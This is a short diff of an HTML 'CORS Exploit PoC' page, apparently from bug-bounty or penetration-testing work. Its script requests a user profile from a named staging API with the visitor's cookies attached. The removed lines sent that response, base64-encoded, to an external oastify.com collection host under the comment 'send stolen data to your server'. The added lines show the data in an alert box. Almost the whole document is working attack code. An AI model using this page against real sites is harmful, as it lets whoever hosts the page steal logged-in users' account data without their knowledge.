@@ -2,16 +2,15 @@
 <html>
 <body>
 <h1>CORS Exploit PoC</h1>
-<script>
+    <script>
 fetch("https://staging.mycasavi.com/api/v1/profile/user", {
     method: "GET",
     credentials: "include"
 })
 .then(r => r.text())
-.then(data => {
-    // send stolen data to your server/log it
-    fetch("https://m9wwfmwclcldsfi462pa46fht8z4nvbk.oastify.com/YOUR-ID?data=" + btoa(data));
-});
+.then(d => alert(d))
+.catch(e => alert("Error: " + e));
 </script>
+
 </body>
 </html>
